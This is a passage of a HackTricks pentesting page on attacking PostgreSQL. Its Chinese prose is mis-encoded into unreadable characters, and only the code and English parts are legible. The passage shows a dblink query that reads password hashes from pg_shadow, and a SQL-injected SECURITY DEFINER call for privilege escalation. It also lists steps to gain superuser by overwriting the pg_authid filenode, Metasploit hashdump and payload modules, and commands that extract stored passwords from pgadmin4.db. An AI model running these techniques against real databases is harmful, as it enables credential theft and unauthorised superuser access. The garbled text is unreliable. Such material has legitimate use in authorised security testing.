è¯·æ³¨æ„ï¼Œä¹‹å‰çš„æŸ¥è¯¢è¦æ­£å¸¸å·¥ä½œ<strong>éœ€è¦å­˜åœ¨å‡½æ•° <code>dblink</code></strong>ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨åˆ›å»ºå®ƒã€‚</p>
<pre><code class="language-sql">CREATE EXTENSION dblink;
</code></pre>
<p>{% endhint %}</p>
<p>å¦‚æœæ‚¨æ‹¥æœ‰å…·æœ‰æ›´é«˜æƒé™çš„ç”¨æˆ·çš„å¯†ç ï¼Œä½†è¯¥ç”¨æˆ·ä¸å…è®¸ä»å¤–éƒ¨ IP ç™»å½•ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡½æ•°ä»¥è¯¥ç”¨æˆ·çš„èº«ä»½æ‰§è¡ŒæŸ¥è¯¢ï¼š</p>
<pre><code class="language-sql">SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
</code></pre>
<p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ£€æŸ¥æ­¤å‡½æ•°æ˜¯å¦å­˜åœ¨ï¼š</p>
<pre><code class="language-sql">SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
</code></pre>
<h3 id="è‡ªå®šä¹‰å®šä¹‰çš„å‡½æ•°ä¸-security-definer"><a class="header" href="#è‡ªå®šä¹‰å®šä¹‰çš„å‡½æ•°ä¸-security-definer"><strong>è‡ªå®šä¹‰å®šä¹‰çš„å‡½æ•°ä¸</strong> SECURITY DEFINER</a></h3>
<p><a href="https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql"><strong>åœ¨è¿™ç¯‡æ–‡ç« ä¸­</strong></a>ï¼Œæ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿåœ¨IBMæä¾›çš„postgreså®ä¾‹ä¸­è¿›è¡Œæƒé™æå‡ï¼Œå› ä¸ºä»–ä»¬<strong>å‘ç°äº†è¿™ä¸ªå¸¦æœ‰SECURITY DEFINERæ ‡å¿—çš„å‡½æ•°</strong>ï¼š</p>
<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>
<p>æ­£å¦‚<a href="https://www.postgresql.org/docs/current/sql-createfunction.html"><strong>æ–‡æ¡£ä¸­æ‰€è§£é‡Šçš„</strong></a>ï¼Œå¸¦æœ‰<strong>SECURITY DEFINERçš„å‡½æ•°æ˜¯ä»¥</strong> <strong>æ‹¥æœ‰è€…çš„æƒé™</strong> <strong>æ‰§è¡Œçš„</strong>ã€‚å› æ­¤ï¼Œå¦‚æœè¯¥å‡½æ•°<strong>æ˜“å—SQLæ³¨å…¥æ”»å‡»</strong>æˆ–æ­£åœ¨å¯¹<strong>ç”±æ”»å‡»è€…æ§åˆ¶çš„å‚æ•°æ‰§è¡ŒæŸäº›ç‰¹æƒæ“ä½œ</strong>ï¼Œåˆ™å¯èƒ½è¢«æ»¥ç”¨ä»¥<strong>åœ¨postgresä¸­æå‡æƒé™</strong>ã€‚</p>
<p>åœ¨å‰é¢ä»£ç çš„ç¬¬4è¡Œä¸­å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°å…·æœ‰<strong>SECURITY DEFINER</strong>æ ‡å¿—ã€‚</p>
<pre><code class="language-sql">CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
</code></pre>
<p>ç„¶å<strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼š</p>
<figure><img src="../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>
<h3 id="ä½¿ç”¨-plpgsql-è¿›è¡Œå¯†ç æš´åŠ›ç ´è§£"><a class="header" href="#ä½¿ç”¨-plpgsql-è¿›è¡Œå¯†ç æš´åŠ›ç ´è§£">ä½¿ç”¨ PL/pgSQL è¿›è¡Œå¯†ç æš´åŠ›ç ´è§£</a></h3>
<p><strong>PL/pgSQL</strong> æ˜¯ä¸€ç§<strong>åŠŸèƒ½é½å…¨çš„ç¼–ç¨‹è¯­è¨€</strong>ï¼Œç›¸æ¯”äº SQL æä¾›äº†æ›´å¼ºçš„è¿‡ç¨‹æ§åˆ¶ã€‚å®ƒæ”¯æŒä½¿ç”¨<strong>å¾ªç¯</strong>å’Œå…¶ä»–<strong>æ§åˆ¶ç»“æ„</strong>æ¥å¢å¼ºç¨‹åºé€»è¾‘ã€‚æ­¤å¤–ï¼Œ<strong>SQL è¯­å¥</strong>å’Œ<strong>è§¦å‘å™¨</strong>èƒ½å¤Ÿè°ƒç”¨ä½¿ç”¨<strong>PL/pgSQL è¯­è¨€</strong>åˆ›å»ºçš„å‡½æ•°ã€‚è¿™ç§é›†æˆä½¿å¾—æ•°æ®åº“ç¼–ç¨‹å’Œè‡ªåŠ¨åŒ–çš„æ–¹æ³•æ›´åŠ å…¨é¢å’Œçµæ´»ã€‚<br />
<strong>æ‚¨å¯ä»¥æ»¥ç”¨è¿™ç§è¯­è¨€æ¥è¯·æ±‚ PostgreSQL è¿›è¡Œç”¨æˆ·å‡­æ®çš„æš´åŠ›ç ´è§£ã€‚</strong></p>
<p>{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
<a href="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.html">pl-pgsql-password-bruteforce.md</a>
{% endcontent-ref %}</p>
<h3 id="é€šè¿‡è¦†ç›–å†…éƒ¨-postgresql-è¡¨è¿›è¡Œæƒé™æå‡"><a class="header" href="#é€šè¿‡è¦†ç›–å†…éƒ¨-postgresql-è¡¨è¿›è¡Œæƒé™æå‡">é€šè¿‡è¦†ç›–å†…éƒ¨ PostgreSQL è¡¨è¿›è¡Œæƒé™æå‡</a></h3>
<p>{% hint style="info" %}
ä»¥ä¸‹æƒé™æå‡å‘é‡åœ¨å—é™çš„ SQLi ç¯å¢ƒä¸­ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºæ‰€æœ‰æ­¥éª¤éƒ½å¯ä»¥é€šè¿‡åµŒå¥—çš„ SELECT è¯­å¥æ‰§è¡Œ
{% endhint %}</p>
<p>å¦‚æœæ‚¨å¯ä»¥<strong>è¯»å–å’Œå†™å…¥ PostgreSQL æœåŠ¡å™¨æ–‡ä»¶</strong>ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¦†ç›–ä¸å†…éƒ¨ <code>pg_authid</code> è¡¨ç›¸å…³è”çš„ PostgreSQL ç£ç›˜æ–‡ä»¶èŠ‚ç‚¹æ¥<strong>æˆä¸ºè¶…çº§ç”¨æˆ·</strong>ã€‚</p>
<p>æœ‰å…³<strong>æ­¤æŠ€æœ¯</strong>çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·<a href="https://adeadfed.com/posts/updating-postgresql-data-without-update/"><strong>ç‚¹å‡»è¿™é‡Œ</strong></a><strong>ã€‚</strong></p>
<p>æ”»å‡»æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>è·å– PostgreSQL æ•°æ®ç›®å½•</li>
<li>è·å–ä¸ <code>pg_authid</code> è¡¨ç›¸å…³è”çš„æ–‡ä»¶èŠ‚ç‚¹çš„ç›¸å¯¹è·¯å¾„</li>
<li>é€šè¿‡ <code>lo_*</code> å‡½æ•°ä¸‹è½½æ–‡ä»¶èŠ‚ç‚¹</li>
<li>è·å–ä¸ <code>pg_authid</code> è¡¨ç›¸å…³è”çš„æ•°æ®ç±»å‹</li>
<li>ä½¿ç”¨ <a href="https://github.com/adeadfed/postgresql-filenode-editor">PostgreSQL æ–‡ä»¶èŠ‚ç‚¹ç¼–è¾‘å™¨</a> <a href="https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table">ç¼–è¾‘æ–‡ä»¶èŠ‚ç‚¹</a>ï¼›å°†æ‰€æœ‰ <code>rol*</code> å¸ƒå°”æ ‡å¿—è®¾ç½®ä¸º 1 ä»¥è·å¾—å®Œå…¨æƒé™ã€‚</li>
<li>é€šè¿‡ <code>lo_*</code> å‡½æ•°é‡æ–°ä¸Šä¼ ç¼–è¾‘åçš„æ–‡ä»¶èŠ‚ç‚¹ï¼Œå¹¶è¦†ç›–ç£ç›˜ä¸Šçš„åŸå§‹æ–‡ä»¶</li>
<li><em>(å¯é€‰)</em> é€šè¿‡è¿è¡Œä¸€ä¸ªæ˜‚è´µçš„ SQL æŸ¥è¯¢æ¸…é™¤å†…å­˜ä¸­çš„è¡¨ç¼“å­˜</li>
<li>ç°åœ¨æ‚¨åº”è¯¥æ‹¥æœ‰å®Œæ•´è¶…çº§ç®¡ç†å‘˜çš„æƒé™ã€‚</li>
</ol>
<h2 id="post"><a class="header" href="#post"><strong>POST</strong></a></h2>
<pre><code>msf&gt; use auxiliary/scanner/postgres/postgres_hashdump
msf&gt; use auxiliary/scanner/postgres/postgres_schemadump
msf&gt; use auxiliary/admin/postgres/postgres_readfile
msf&gt; use exploit/linux/postgres/postgres_payload
msf&gt; use exploit/windows/postgres/postgres_payload
</code></pre>
<h3 id="logging"><a class="header" href="#logging">logging</a></h3>
<p>åœ¨ <em><strong>postgresql.conf</strong></em> æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ›´æ”¹æ¥å¯ç”¨ postgresql æ—¥å¿—ï¼š</p>
<pre><code class="language-bash">log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/&lt;PG_Version&gt;/main/log/
#or in /var/lib/postgresql/&lt;PG_Version&gt;/main/pg_log/
</code></pre>
<p>ç„¶åï¼Œ<strong>é‡å¯æœåŠ¡</strong>ã€‚</p>
<h3 id="pgadmin"><a class="header" href="#pgadmin">pgadmin</a></h3>
<p><a href="https://www.pgadmin.org">pgadmin</a> æ˜¯ä¸€ä¸ªç”¨äº PostgreSQL çš„ç®¡ç†å’Œå¼€å‘å¹³å°ã€‚<br />
æ‚¨å¯ä»¥åœ¨ <em><strong>pgadmin4.db</strong></em> æ–‡ä»¶ä¸­æ‰¾åˆ° <strong>å¯†ç </strong>ã€‚<br />
æ‚¨å¯ä»¥ä½¿ç”¨è„šæœ¬ä¸­çš„ <em><strong>decrypt</strong></em> å‡½æ•°å¯¹å…¶è¿›è¡Œè§£å¯†ï¼š<a href="https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py">https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py</a></p>
<pre><code class="language-bash">sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
</code></pre>
<h3 id="pg_hba"><a class="header" href="#pg_hba">pg_hba</a></h3>
<p>PostgreSQLä¸­çš„å®¢æˆ·ç«¯èº«ä»½éªŒè¯é€šè¿‡ä¸€ä¸ªåä¸º<strong>pg_hba.conf</strong>çš„é…ç½®æ–‡ä»¶è¿›è¡Œç®¡ç†ã€‚è¯¥æ–‡ä»¶åŒ…å«ä¸€ç³»åˆ—è®°å½•ï¼Œæ¯æ¡è®°å½•æŒ‡å®šäº†è¿æ¥ç±»å‹ã€å®¢æˆ·ç«¯IPåœ°å€èŒƒå›´ï¼ˆå¦‚é€‚ç”¨ï¼‰ã€æ•°æ®åº“åç§°ã€ç”¨æˆ·åä»¥åŠç”¨äºåŒ¹é…è¿æ¥çš„èº«ä»½éªŒè¯æ–¹æ³•ã€‚ç¬¬ä¸€ä¸ªåŒ¹é…è¿æ¥ç±»å‹ã€å®¢æˆ·ç«¯åœ°å€ã€è¯·æ±‚çš„æ•°æ®åº“å’Œç”¨æˆ·åçš„è®°å½•å°†ç”¨äºèº«ä»½éªŒè¯ã€‚å¦‚æœèº«ä»½éªŒè¯å¤±è´¥ï¼Œåˆ™æ²¡æœ‰åå¤‡æˆ–å¤‡ä»½ã€‚å¦‚æœæ²¡æœ‰è®°å½•åŒ¹é…ï¼Œåˆ™æ‹’ç»è®¿é—®ã€‚</p>
<p>åœ¨pg_hba.confä¸­å¯ç”¨çš„åŸºäºå¯†ç çš„èº«ä»½éªŒè¯æ–¹æ³•æœ‰<strong>md5</strong>ã€<strong>crypt</strong>å’Œ<strong>password</strong>ã€‚è¿™äº›æ–¹æ³•åœ¨å¯†ç ä¼ è¾“æ–¹å¼ä¸Šæœ‰æ‰€ä¸åŒï¼šMD5å“ˆå¸Œã€cryptåŠ å¯†æˆ–æ˜æ–‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œcryptæ–¹æ³•ä¸èƒ½ä¸åœ¨pg_authidä¸­åŠ å¯†çš„å¯†ç ä¸€èµ·ä½¿ç”¨ã€‚</p>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
Use <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=pentesting-postgresql"><strong>Trickest</strong></a> to easily build and <strong>automate workflows</strong> powered by the world's <strong>most advanced</strong> community tools.<br />
Get Access Today:</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=pentesting-postgresql" %}</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/5353-udp-multicast-dns-mdns.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/5439-pentesting-redshift.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/5353-udp-multicast-dns-mdns.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/5439-pentesting-redshift.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
